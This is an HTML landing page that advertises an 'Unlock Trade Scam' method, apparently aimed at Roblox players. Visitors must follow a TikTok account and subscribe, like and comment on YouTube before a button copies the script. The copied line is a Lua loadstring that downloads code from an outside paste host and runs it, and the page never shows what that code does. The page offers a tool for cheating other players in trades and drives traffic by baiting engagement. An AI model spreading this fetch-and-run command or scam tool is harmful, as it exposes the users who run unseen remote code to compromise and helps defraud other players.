<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Unlock Trade Scam</title>

<style>
body {
  margin: 0;
  min-height: 100vh;
  background: radial-gradient(circle at top,#0f172a,#020617);
  font-family: Arial, sans-serif;
  color: #fff;
  display: flex;
  justify-content: center;
}

.container {
  width: 100%;
  max-width: 420px;
  padding: 20px;
}

.card {
  background: #0b1220;
  border-radius: 18px;
  padding: 22px;
  box-shadow: 0 20px 45px rgba(0,0,0,.6);
}

.title {
  text-align: center;
  font-size: 26px;
  font-weight: bold;
  color: #38bdf8;
}

.subtitle {
  text-align: center;
  font-size: 14px;
  opacity: .85;
  margin: 8px 0 20px;
}

.step {
  background: #111a2e;
  border-radius: 14px;
  padding: 14px;
  margin-bottom: 10px;
  cursor: pointer;
  font-weight: bold;
  text-align: center;
  transition: .2s;
}

.step:hover {
  transform: scale(1.02);
}

.done {
  opacity: .6;
}

.tiktok { background:#1d4ed8; }
.youtube { background:#ca8a04; }
.like { background:#16a34a; }
.comment { background:#db2777; }
.watch { background:#dc2626; }

.progress {
  height: 12px;
  background: #1e293b;
  border-radius: 999px;
  overflow: hidden;
  margin-top: 16px;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg,#38bdf8,#0ea5e9);
  transition: width .3s;
}

.percent {
  text-align: center;
  font-size: 13px;
  margin-top: 6px;
}

.unlock {
  display: none;
  margin-top: 20px;
}

.script-box {
  background: #020617;
  border-radius: 14px;
  padding: 16px;
}

.copy {
  margin-top: 10px;
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background: #38bdf8;
  color: #000;
  font-weight: bold;
  cursor: pointer;
}
</style>
</head>

<body>

<div class="container">
  <div class="card">

    <!-- TITLE CHANGED -->
    <div class="title">🔑 Unlock Trade Scam</div>

    <!-- SUBTITLE CHANGED -->
    <div class="subtitle">Complete all steps to unlock the trade method</div>

    <div class="step tiktok" onclick="complete(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">
      📌 Follow TikTok
    </div>

    <div class="step youtube" onclick="complete(this,'https://youtube.com/@xxxvoid_scriptzxxx?si=SCGX78XJf16UEyoq')">
      🔔 Subscribe YouTube
    </div>

    <div class="step like" onclick="complete(this,video)">
      👍 Like the Video
    </div>

    <div class="step comment" onclick="complete(this,video)">
      💬 Comment on the Video
    </div>

    <div class="step watch" onclick="complete(this,video)">
      ▶️ Watch the Video
    </div>

    <div class="progress">
      <div class="bar" id="bar"></div>
    </div>
    <div class="percent" id="percent">0%</div>

    <div class="unlock" id="unlock">
      <div class="script-box">
        <b>Trade Script</b>
        <button class="copy" onclick="copyScript()">Copy Script</button>
      </div>
    </div>

  </div>
</div>

<script>
const video = "https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M";
const total = 5;
let done = 0;

function complete(el, link) {
  if (el.dataset.done) return;
  el.dataset.done = true;
  el.classList.add("done");
  done++;
  update();
  window.open(link, "_blank");
}

function update() {
  const percent = Math.floor((done / total) * 100);
  document.getElementById("bar").style.width = percent + "%";
  document.getElementById("percent").innerText = percent + "%";
  if (percent === 100) {
    document.getElementById("unlock").style.display = "block";
  }
}

function copyScript() {
  navigator.clipboard.writeText(
`loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/fRNF9vgOh5toji9n/raw", true))()`
  );
  alert("Copied!");
}
</script>

</body>
</html>
